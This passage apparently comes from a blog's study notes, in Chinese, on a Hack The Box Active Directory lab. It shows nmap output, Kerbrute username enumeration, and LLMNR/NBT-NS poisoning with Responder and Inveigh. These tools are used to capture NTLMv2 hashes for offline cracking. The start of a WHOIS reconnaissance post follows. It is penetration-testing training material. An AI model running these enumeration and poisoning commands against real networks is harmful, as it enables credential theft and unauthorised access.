15:12:06Z)135/tcp  open  msrpc         Microsoft Windows RPC139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)|_ssl-date: 2022-04-04T15:12:53+00:00; -1s from scanner time.| ssl-cert: Subject:| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL| Issuer: commonName=INLANEFREIGHT-CA| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2022-03-30T22:40:24| Not valid after:  2023-03-30T22:40:24| MD5:   3a09 d87a 9ccb 5498 2533 e339 ebe3 443f|_SHA-1: 9731 d8ec b219 4301 c231 793e f913 6868 d39f 7920445/tcp  open  microsoft-ds?464/tcp  open  kpasswd5?593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)&lt;SNIP&gt;  3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)3389/tcp open  ms-wbt-server Microsoft Terminal Services| rdp-ntlm-info:|   Target_Name: INLANEFREIGHT|   NetBIOS_Domain_Name: INLANEFREIGHT|   NetBIOS_Computer_Name: ACADEMY-EA-DC01|   DNS_Domain_Name: INLANEFREIGHT.LOCAL|   DNS_Computer_Name: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL|   DNS_Tree_Name: INLANEFREIGHT.LOCAL|   Product_Version: 10.0.17763|_  System_Time: 2022-04-04T15:12:45+00:00&lt;SNIP&gt;5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Service Unavailable|_http-server-header: Microsoft-HTTPAPI/2.0Service Info: Host: ACADEMY-EA-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><p>我们的扫描为我们提供了NetBIOS和DNS使用的命名标准，我们可以看到一些主机打开了RDP，它们为我们指明了INLANEFREIGHT的主域控制器的方向。LOCAL域（ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL）。</p><h2 id="Identifying-Users"><a href="#Identifying-Users" class="headerlink" title="Identifying Users"></a>Identifying Users</h2><h2 id="Identifying-Users-1"><a href="#Identifying-Users-1" class="headerlink" title="Identifying Users"></a>Identifying Users</h2><p><a href="https://github.com/ropnop/kerbrute">Kerbrute</a> 可以是域帐户枚举的一个更隐蔽的选项。它利用了这样一个事实，即Kerberos预身份验证失败通常不会触发日志或警报。我们将把Kerbrute与Insidetrust的jsmith.txt或jsmith2.txt用户列表结合使用。此存储库包含许多不同的用户列表，当从未经身份验证的角度开始枚举用户时，这些列表非常有用。我们可以将Kerbrute指向我们之前找到的DC，并为其提供一个单词列表。该工具很快，我们将收到结果，让我们知道找到的账户是否有效，这是发起密码喷涂等攻击的一个很好的起点，我们将在本模块稍后深入介绍。 为了开始使用Kerbrute，我们可以从Linux、Windows和Mac下载用于测试工具的预编译二进制文件，也可以自己编译。这通常是我们在客户端环境中引入的任何工具的最佳实践。要编译二进制文件以在我们选择的系统上使用，我们首先克隆repo：</p><h4 id="Cloning-Kerbrute-GitHub-Repo"><a href="#Cloning-Kerbrute-GitHub-Repo" class="headerlink" title="Cloning Kerbrute GitHub Repo"></a>Cloning Kerbrute GitHub Repo</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo git clone https://github.com/ropnop/kerbrute.git</code></pre><p>键入make help将向我们显示可用的编译选项。</p><pre><code class="shell-session">Tanin@htb[/htb]$ make helphelp:            Show this help.windows:  Make Windows x86 and x64 Binarieslinux:  Make Linux x86 and x64 Binariesmac:  Make Darwin (Mac) x86 and x64 Binariesclean:  Delete any binariesall:  Make Windows, Linux and Mac x86/x64 Binaries</code></pre><p>我们可以选择只编译一个二进制文件或类型make all，并分别编译一个用于Linux、Windows和Mac系统（每个系统都有x86和x64版本）。</p><p>新创建的dist目录将包含我们编译的二进制文件。</p><pre><code class="shell-session">Tanin@htb[/htb]$ ls dist/kerbrute_darwin_amd64  kerbrute_linux_386  kerbrute_linux_amd64  kerbrute_windows_386.exe  kerbrute_windows_amd64.exe</code></pre><h4 id="Testing-the-kerbrute-linux-amd64-Binary"><a href="#Testing-the-kerbrute-linux-amd64-Binary" class="headerlink" title="Testing the kerbrute_linux_amd64 Binary"></a>Testing the kerbrute_linux_amd64 Binary</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ./kerbrute_linux_amd64     __             __               __        / /_____  _____/ /_  _______  __/ /____   / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __//_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnopThis tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.Warning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accountsUsage:  kerbrute [command]    &lt;SNIP&gt;</code></pre><p>我们可以将该工具添加到我们的PATH中，使其可以从主机上的任何位置轻松访问。</p><h4 id="Adding-the-Tool-to-our-Path"><a href="#Adding-the-Tool-to-our-Path" class="headerlink" title="Adding the Tool to our Path"></a>Adding the Tool to our Path</h4><pre><code class="shell-session">Tanin@htb[/htb]$ echo $PATH/home/htb-student/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/snap/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/htb-student/.dotnet/tools</code></pre><h4 id="Moving-the-Binary"><a href="#Moving-the-Binary" class="headerlink" title="Moving the Binary"></a>Moving the Binary</h4><pre><code class="shell-session">sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute</code></pre><h4 id="Enumerating-Users-with-Kerbrute"><a href="#Enumerating-Users-with-Kerbrute" class="headerlink" title="Enumerating Users with Kerbrute"></a>Enumerating Users with Kerbrute</h4><pre><code class="shell-session">Tanin@htb[/htb]$ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users2021/11/17 23:01:46 &gt;  Using KDC(s):2021/11/17 23:01:46 &gt;   172.16.5.5:882021/11/17 23:01:46 &gt;  [+] VALID USERNAME:       jjones@INLANEFREIGHT.LOCAL2021/11/17 23:01:46 &gt;  [+] VALID USERNAME:       sbrown@INLANEFREIGHT.LOCAL2021/11/17 23:01:46 &gt;  [+] VALID USERNAME:       tjohnson@INLANEFREIGHT.LOCAL2021/11/17 23:01:50 &gt;  [+] VALID USERNAME:       evalentin@INLANEFREIGHT.LOCAL &lt;SNIP&gt; 2021/11/17 23:01:51 &gt;  [+] VALID USERNAME:       sgage@INLANEFREIGHT.LOCAL2021/11/17 23:01:51 &gt;  [+] VALID USERNAME:       jshay@INLANEFREIGHT.LOCAL2021/11/17 23:01:51 &gt;  [+] VALID USERNAME:       jhermann@INLANEFREIGHT.LOCAL2021/11/17 23:01:51 &gt;  [+] VALID USERNAME:       whouse@INLANEFREIGHT.LOCAL2021/11/17 23:01:51 &gt;  [+] VALID USERNAME:       emercer@INLANEFREIGHT.LOCAL2021/11/17 23:01:52 &gt;  [+] VALID USERNAME:       wshepherd@INLANEFREIGHT.LOCAL2021/11/17 23:01:56 &gt;  Done! Tested 48705 usernames (56 valid) in 9.940 seconds</code></pre><h2 id="Identifying-Potential-Vulnerabilities"><a href="#Identifying-Potential-Vulnerabilities" class="headerlink" title="Identifying Potential Vulnerabilities"></a>Identifying Potential Vulnerabilities</h2><p>本地系统帐户NT AUTHORITY\system是Windows操作系统中的内置帐户。它在操作系统中具有最高级别的访问权限，用于运行大多数Windows服务。默认情况下，第三方服务在该帐户的上下文中运行也是非常常见的。加入域的主机上的SYSTEM帐户将能够通过模拟计算机帐户来枚举Active Directory，而计算机帐户本质上只是另一种用户帐户。在域环境中拥有SYSTEM级别的访问权限几乎相当于拥有域用户帐户。 有几种方法可以在主机上获得SYSTEM级别的访问权限，包括但不限于： 远程Windows漏洞利用，如MS08-067、EternalBlue或BlueKeep。 滥用在SYSTEM帐户上下文中运行的服务，或使用<a href="https://github.com/ohpe/juicy-potato">Juicy Potato</a>滥用服务帐户SeImpersonate权限。这种类型的攻击在旧的Windows操作系统上是可能的，但在Windows Server 2019上并不总是可能的。 Windows操作系统中的本地权限提升缺陷，如Windows 10任务计划程序0天。 使用本地帐户在加入域的主机上获得管理员访问权限，并使用Psexec启动SYSTEM cmd窗口 通过在加入域的主机上获得SYSTEM级别的访问权限，您将能够执行以下操作，但不限于： 使用内置工具或攻击性工具（如BloodHound和PowerView）枚举域。 在同一域内执行Kerberoasting&#x2F;ASREPRoasting攻击。 运行Inveigh等工具来收集Net-NTLMv2哈希或执行SMB中继攻击。 执行令牌模拟以劫持特权域用户帐户。 执行ACL攻击。</p><h1 id="Sniffing-out-a-Foothold"><a href="#Sniffing-out-a-Foothold" class="headerlink" title="Sniffing out a Foothold"></a>Sniffing out a Foothold</h1><h1 id="LLMNR-x2F-NBT-NS-Poisoning-from-Linux"><a href="#LLMNR-x2F-NBT-NS-Poisoning-from-Linux" class="headerlink" title="LLMNR&#x2F;NBT-NS Poisoning - from Linux"></a>LLMNR&#x2F;NBT-NS Poisoning - from Linux</h1><p>在这个阶段，我们将同时使用两种不同的技术：网络中毒和密码喷洒。我们将执行这些操作，目的是为域用户帐户获取有效的明文凭据，从而使我们在域中有一个立足点，从认证的角度开始下一阶段的枚举。</p><p>收集凭据并在评估过程中获得初步立足点的常见方法：对链路本地多播名称解析（LLMNR）和NetBIOS名称服务（NBT-NS）广播的中间人攻击。根据网络的不同，此攻击可能提供低特权或管理级别的密码哈希，这些哈希可以离线破解，甚至可以是明文凭据。这些哈希有时也可用于执行SMB中继攻击，以向具有管理权限的域中的一台或多台主机进行身份验证，而无需离线破解密码哈希。</p><h2 id="LLMNR-amp-NBT-NS-Primer"><a href="#LLMNR-amp-NBT-NS-Primer" class="headerlink" title="LLMNR &amp; NBT-NS Primer"></a>LLMNR &amp; NBT-NS Primer</h2><p>链路本地多播名称解析（LLMNR）和NetBIOS名称服务（NBT-NS）是Microsoft Windows组件，用作DNS失败时可以使用的主机标识的替代方法。如果一台机器试图解析主机，但DNS解析失败，通常情况下，该机器会尝试通过LLMNR向本地网络上的所有其他机器询问正确的主机地址。LLMNR基于域名系统（DNS）格式，并允许同一本地链路上的主机为其他主机执行名称解析。它本机使用UDP上的端口&#x3D;&#x3D;5355&#x3D;&#x3D;。如果LLMNR失败，将使用NBT-NS。NBT-NS通过其NetBIOS名称识别本地网络上的系统。&#x3D;&#x3D;NBT-NS通过UDP利用端口137&#x3D;&#x3D;。 这里的关键是，当LLMNR&#x2F;NBT-NS用于名称解析时，网络上的任何主机都可以回复。这就是我们使用Responder来毒害这些请求的地方。通过网络访问，我们可以通过响应LLMNR和NBT-NS流量来欺骗广播域中的权威名称解析源（在这种情况下，是指应该属于网段的主机），就好像它们有请求主机的答案一样。这种中毒行为是为了让受害者通过假装我们的流氓系统知道请求主机的位置来与我们的系统通信。如果请求的主机需要名称解析或身份验证操作，我们可以捕获NetNTLM哈希，并对其进行离线暴力攻击，试图检索明文密码。捕获的身份验证请求也可以被中继以访问另一台主机，或者针对同一台主机上的不同协议（如LDAP）使用。LLMNR&#x2F;NBNS欺骗加上缺乏SMB签名，通常会导致对域内主机的管理访问。SMB中继攻击将在稍后的关于横向移动的模块中介绍。</p><h2 id="Quick-Example-LLMNR-x2F-NBT-NS-Poisoning"><a href="#Quick-Example-LLMNR-x2F-NBT-NS-Poisoning" class="headerlink" title="Quick Example - LLMNR&#x2F;NBT-NS Poisoning *"></a>Quick Example - LLMNR&#x2F;NBT-NS Poisoning *</h2><p>让我们从一个非常高的层面来简要介绍一下攻击流程的示例： 主机试图连接到位于\print01.inlanefreight.local的打印服务器，但意外键入\printer01.inlanefleight.local。 DNS服务器响应，声明此主机未知。 然后，主机向整个本地网络广播，询问是否有人知道\printer01.inlanefreight.local的位置。 攻击者（我们运行的是Responder）响应主机，指出主机正在查找\printer01.inlanefreight.local。 主机相信此回复，并使用用户名和NTLMv2密码哈希向攻击者发送身份验证请求。 如果存在正确的条件，则可以脱机破解此哈希，或将其用于SMB中继攻击。</p><table><thead><tr><th><strong>Tool</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><a href="https://github.com/lgandx/Responder">Responder</a></td><td>Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.</td></tr><tr><td><a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a></td><td>Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks.</td></tr><tr><td><a href="https://www.metasploit.com/">Metasploit</a></td><td>Metasploit has several built-in scanners and spoofing modules made to deal with poisoning attacks.</td></tr></tbody></table><p>我们通常使用Linux攻击主机从客户端内部网络上的匿名位置开始进行内部渗透测试。像Responder这样的工具非常适合建立一个立足点，我们稍后可以通过进一步的枚举和攻击来扩展它。Responder是用Python编写的，通常用于Linux攻击主机，但也有适用于Windows的.exe版本。Inveigh同时使用C#和PowerShell编写（被认为是遗留版本）。这两种工具都可以用来攻击以下协议：</p><ul><li>LLMNR</li><li>DNS</li><li>MDNS</li><li>NBNS</li><li>DHCP</li><li>ICMP</li><li>HTTP</li><li>HTTPS</li><li>SMB</li><li>LDAP</li><li>WebDAV</li><li>Proxy Auth</li></ul><p>Responder also has support for:</p><ul><li>MSSQL</li><li>DCE-RPC</li><li>FTP, POP3, IMAP, and SMTP auth</li></ul><h3 id="Responder-In-Action"><a href="#Responder-In-Action" class="headerlink" title="Responder In Action *"></a>Responder In Action *</h3><p>让我们通过在控制台中键入responser-h来查看一些可用的选项。</p><p>如模块前面所示，-A标志使我们进入分析模式，使我们能够在环境中查看NBT-NS、BROWSER和LLMNR请求，而不会破坏任何响应。我们必须始终提供接口或IP。我们通常想要使用的一些常见选项是-wf；这将启动WPAD rogue代理服务器，而-f将尝试对远程主机操作系统和版本进行指纹识别。如果遇到问题，我们可以使用-v标志来增加详细程度，但这将导致大量额外的数据打印到控制台。其他选项（如-F和-P）可用于强制NTLM或基本身份验证和强制代理身份验证，但可能会导致登录提示，因此应谨慎使用。-w标志的使用利用了内置的WPAD代理服务器。这可能非常有效，尤其是在大型组织中，因为如果浏览器启用了“自动检测”设置，它将捕获启动Internet Explorer的任何用户的所有HTTP请求。</p><p>使用上面显示的配置，响应程序将侦听并回答它在线路上看到的任何请求。如果成功并成功捕获了哈希，Responder将在屏幕上打印出来，并将其写入&#x2F;usr&#x2F;share&#x2F;resporter&#x2F;logs目录中的每个主机的日志文件中。哈希以（MODULE_NAME）-（HASH_TYPE）-（CLIENT_IP）.txt格式保存，除非启用-v模式，否则一个哈希将打印到控制台并存储在其关联的日志文件中。例如，日志文件可能类似于SMB-NTLMv2-SP-172.16.5.25。哈希也存储在SQLite数据库中，该数据库可以在Responder.conf配置文件中配置，通常位于&#x2F;usr&#x2F;share&#x2F;resporter中，除非我们直接从GitHub克隆Responder repo。 我们必须以sudo权限或root身份运行该工具，并确保攻击主机上有以下端口可用，使其发挥最佳功能：</p><pre><code class="shell-session">UDP 137, UDP 138, UDP 53, UDP/TCP 389,TCP 1433, UDP 1434, TCP 80, TCP 135, TCP 139, TCP 445, TCP 21, TCP 3141,TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353</code></pre><h4 id="Responder-Logs"><a href="#Responder-Logs" class="headerlink" title="Responder Logs"></a>Responder Logs</h4><pre><code class="shell-session">Tanin@htb[/htb]$ lsAnalyzer-Session.log                Responder-Session.logConfig-Responder.log                SMB-NTLMv2-SSP-172.16.5.200.txtHTTP-NTLMv2-172.16.5.200.txt        SMB-NTLMv2-SSP-172.16.5.25.txtPoisoners-Session.log               SMB-NTLMv2-SSP-172.16.5.50.txtProxy-Auth-NTLMv2-172.16.5.200.txt</code></pre><h4 id="Starting-Responder-with-Default-Settings"><a href="#Starting-Responder-with-Default-Settings" class="headerlink" title="Starting Responder with Default Settings"></a>Starting Responder with Default Settings</h4><pre><code class="bash">sudo responder -I ens224 </code></pre><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309232006463.png" alt="image"></p><h1 id="LLMNR-x2F-NBT-NS-Poisoning-from-Windows"><a href="#LLMNR-x2F-NBT-NS-Poisoning-from-Windows" class="headerlink" title="LLMNR&#x2F;NBT-NS Poisoning - from Windows"></a>LLMNR&#x2F;NBT-NS Poisoning - from Windows</h1><p>本节将探讨 <a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a>工具，并尝试捕获另一组凭据。</p><h2 id="Inveigh-Overview"><a href="#Inveigh-Overview" class="headerlink" title="Inveigh - Overview"></a>Inveigh - Overview</h2><p>工具Inveigh的工作原理与Responder类似，但使用PowerShell和C#编写。Inveigh可以监听IPv4和IPv6以及其他几种协议，包括LLMNR、DNS、mDNS、NBNS、DHCPv6、ICMPv6、HTTP、HTTPS、SMB、LDAP、WebDAV和代理身份验证。</p><h2 id="Using-Inveigh"><a href="#Using-Inveigh" class="headerlink" title="Using Inveigh"></a>Using Inveigh</h2><pre><code class="powershell-session">PS C:\htb&gt; Import-Module .\Inveigh.ps1PS C:\htb&gt; (Get-Command Invoke-Inveigh).Parameters</code></pre><p>让我们从LLMNR和NBNS欺骗开始Inveigh，然后输出到控制台并写入文件。我们将保留其余的默认值，这可以在这里看到 <a href="https://github.com/Kevin-Robertson/Inveigh#parameter-help">here</a>。</p><pre><code class="powershell-session">PS C:\htb&gt; Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y[*] Inveigh 1.506 started at 2022-02-28T19:26:30[+] Elevated Privilege Mode = Enabled[+] Primary IP Address = 172.16.5.25[+] Spoofer IP Address = 172.16.5.25[+] ADIDNS Spoofer = Disabled[+] DNS Spoofer = Enabled[+] DNS TTL = 30 Seconds[+] LLMNR Spoofer = Enabled[+] LLMNR TTL = 30 Seconds[+] mDNS Spoofer = Disabled[+] NBNS Spoofer For Types 00,20 = Enabled[+] NBNS TTL = 165 Seconds[+] SMB Capture = Enabled[+] HTTP Capture = Enabled[+] HTTPS Certificate Issuer = Inveigh[+] HTTPS Certificate CN = localhost[+] HTTPS Capture = Enabled[+] HTTP/HTTPS Authentication = NTLM[+] WPAD Authentication = NTLM[+] WPAD NTLM Authentication Ignore List = Firefox[+] WPAD Response = Enabled[+] Kerberos TGT Capture = Disabled[+] Machine Account Capture = Disabled[+] Console Output = Full[+] File Output = Enabled[+] Output Directory = C:\ToolsWARNING: [!] Run Stop-Inveigh to stop[*] Press any key to stop console outputWARNING: [-] [2022-02-28T19:26:31] Error starting HTTP listenerWARNING: [!] [2022-02-28T19:26:31] Exception calling &quot;Start&quot; with &quot;0&quot; argument(s): &quot;An attempt was made to access asocket in a way forbidden by its access permissions&quot; $HTTP_listener.Start()[+] [2022-02-28T19:26:31] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled][+] [2022-02-28T19:26:31] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled][+] [2022-02-28T19:26:31] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent][+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled][+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled][+] [2022-02-28T19:26:32] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent][+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled][+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled][+] [2022-02-28T19:26:32] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent][+] [2022-02-28T19:26:33] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled][+] [2022-02-28T19:26:33] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled][+] [2022-02-28T19:26:33] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent][+] [2022-02-28T19:26:34] TCP(445) SYN packet detected from 172.16.5.125:56834[+] [2022-02-28T19:26:34] SMB(445) negotiation request detected from 172.16.5.125:56834[+] [2022-02-28T19:26:34] SMB(445) NTLM challenge 7E3B0E53ADB4AE51 sent to 172.16.5.125:56834&lt;SNIP&gt;</code></pre><p>我们可以看到，我们立即开始获取LLMNR和mDNS请求。下面的动画显示了该工具的作用。</p><p><img src="https://academy.hackthebox.com/storage/modules/143/inveigh_pwsh.png" alt="image"></p><h2 id="C-Inveigh-InveighZero"><a href="#C-Inveigh-InveighZero" class="headerlink" title="C# Inveigh (InveighZero)"></a>C# Inveigh (InveighZero)</h2><p>Invenigh的PowerShell版本是原始版本，不再更新。工具作者维护C#版本，该版本结合了原始PoC C#代码和PowerShell版本中大部分代码的C#端口。在我们可以使用C#版本的工具之前，我们必须编译可执行文件</p><pre><code class="powershell-session">PS C:\htb&gt; .\Inveigh.exe</code></pre><pre><code class="powershell-session">[*] Inveigh 2.0.4 [Started 2022-02-28T20:03:28 | PID 6276][+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8][+] Listener Addresses [IP 0.0.0.0 | IPv6 ::][+] Spoofer Reply Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8][+] Spoofer Options [Repeat Enabled | Local Attacks Disabled][ ] DHCPv6[+] DNS Packet Sniffer [Type A][ ] ICMPv6[+] LLMNR Packet Sniffer [Type A][ ] MDNS[ ] NBNS[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80][ ] HTTPS[+] WebDAV [WebDAVAuth NTLM][ ] Proxy[+] LDAP Listener [Port 389][+] SMB Packet Sniffer [Port 445][+] File Output [C:\Tools][+] Previous Session Files (Not Found)[*] Press ESC to enter/exit interactive console[!] Failed to start HTTP listener on port 80, check IP and port usage.[!] Failed to start HTTPv6 listener on port 80, check IP and port usage.[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled][ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled][ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled][ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled][+] [20:03:31] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent][-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored][+] [20:03:31] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent][-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored][ ] [20:03:32] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled][ ] [20:03:32] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled][ ] [20:03:32] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled][ ] [20:03:32] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled][+] [20:03:32] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent][-] [20:03:32] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored][+] [20:03:32] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent][-] [20:03:32] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]</code></pre><p>正如我们所看到的，该工具启动并显示哪些选项默认启用，哪些选项未启用。带[+]的选项是默认的，默认情况下是启用的，之前带[]的选项是禁用的。正在运行的控制台输出还向我们显示了哪些选项被禁用，因此不会发送响应（上例中为mDNS）。我们还可以看到消息Press ESC to enter&#x2F;exit interactive console，这在运行该工具时非常有用。控制台允许我们访问捕获的凭据&#x2F;哈希，允许我们停止Inveigh等。</p><p>我们可以在Inveigh运行时按esc键进入控制台。</p><pre><code class="powershell-session">&lt;SNIP&gt;[+] [20:10:24] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent][+] [20:10:24] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent][-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored][-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored][-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored][-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored][-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored][-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored][.] [20:10:24] TCP(1433) SYN packet from 172.16.5.125:61310[.] [20:10:24] TCP(1433) SYN packet from 172.16.5.125:61311C(0:0) NTLMv1(0:0) NTLMv2(3:9)&gt; HELP</code></pre><p>在键入HELP并点击enter后，我们将看到几个选项：</p><pre><code class="powershell-session">=============================================== Inveigh Console Commands ===============================================Command                           Description========================================================================================================================GET CONSOLE                     | get queued console outputGET DHCPv6Leases                | get DHCPv6 assigned IPv6 addressesGET LOG                         | get log entries; add search string to filter resultsGET NTLMV1                      | get captured NTLMv1 hashes; add search string to filter resultsGET NTLMV2                      | get captured NTLMv2 hashes; add search string to filter resultsGET NTLMV1UNIQUE                | get one captured NTLMv1 hash per user; add search string to filter resultsGET NTLMV2UNIQUE                | get one captured NTLMv2 hash per user; add search string to filter resultsGET NTLMV1USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv1 hashesGET NTLMV2USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv2 hashesGET CLEARTEXT                   | get captured cleartext credentialsGET CLEARTEXTUNIQUE             | get unique captured cleartext credentialsGET REPLYTODOMAINS              | get ReplyToDomains parameter startup valuesGET REPLYTOHOSTS                | get ReplyToHosts parameter startup valuesGET REPLYTOIPS                  | get ReplyToIPs parameter startup valuesGET REPLYTOMACS                 | get ReplyToMACs parameter startup valuesGET IGNOREDOMAINS               | get IgnoreDomains parameter startup valuesGET IGNOREHOSTS                 | get IgnoreHosts parameter startup valuesGET IGNOREIPS                   | get IgnoreIPs parameter startup valuesGET IGNOREMACS                  | get IgnoreMACs parameter startup valuesSET CONSOLE                     | set Console parameter valueHISTORY                         | get command historyRESUME                          | resume real time console outputSTOP                            | stop Inveigh</code></pre><p>我们可以通过键入GET NTLMV2UNIQUE快速查看捕获的唯一哈希。</p><p>我们可以键入GET NTLMV2USERNAMES并查看我们收集了哪些用户名。如果我们想要一个用户列表来执行额外的枚举，并查看哪些值得尝试使用Hashcat离线破解，这将非常有用。</p>]]></content>
    
    
    <summary type="html">&lt;ul&gt;
&lt;li&gt;Sniffing out a Foothold&lt;/li&gt;
&lt;li&gt;Initial Enumeration&lt;/li&gt;
&lt;li&gt;Sniffing out a Foothold&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
    <category term="AD" scheme="https://taninluv.github.io/tags/AD/"/>
    
  </entry>
  
  <entry>
    <title>Information Gathering</title>
    <link href="https://taninluv.github.io/2023/09/18/Information-Gathering/"/>
    <id>https://taninluv.github.io/2023/09/18/Information-Gathering/</id>
    <published>2023-09-18T08:11:47.000Z</published>
    <updated>2023-09-18T09:49:15.383Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h1><p>信息收集阶段是每次渗透测试的第一步，我们需要在没有目标组织内部信息的情况下模拟外部攻击者。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309181613272.png" alt="img"></p><span id="more"></span><p>例如，我们可以将其视为在基于SSL证书的渗透测试中偶然发现新子域。然而，如果我们仔细观察这些子域，我们经常会看到与主要公司网站不同的技术在使用。子域和vhosts用于呈现其他信息，并执行与主页分离的其他任务。因此，必须了解使用了哪些技术，它们有什么用途，以及它们是如何工作的。在此过程中，我们的目标是从以下领域尽可能多地识别信息：</p><ul><li>域和子域</li><li>IP范围</li><li>基础设施</li><li>虚拟主机</li></ul><h1 id="WHOIS"><a href="#WHOIS" class="headerlink" title="WHOIS"></a>WHOIS</h1><p> <a href="https://en.wikipedia.org/wiki/WHOIS">WHOIS</a>域查找允许我们检索已注册域的域名信息。互联网名称与数字地址分配机构（ICANN）要求经认证的注册商在注册域名后立即在Whois数据库中输入持有人的联系信息、域名的创建和有效期以及其他信息。简单地说，Whois数据库是目前全球注册的所有域名的可搜索列表。 WHOIS查找最初是使用命令行工具执行的。如今，存在许多基于web的工具，但命令行选项通常使我们能够最大限度地控制查询，并帮助过滤和排序结果输出。Sysinternals WHOIS for Windows或Linux 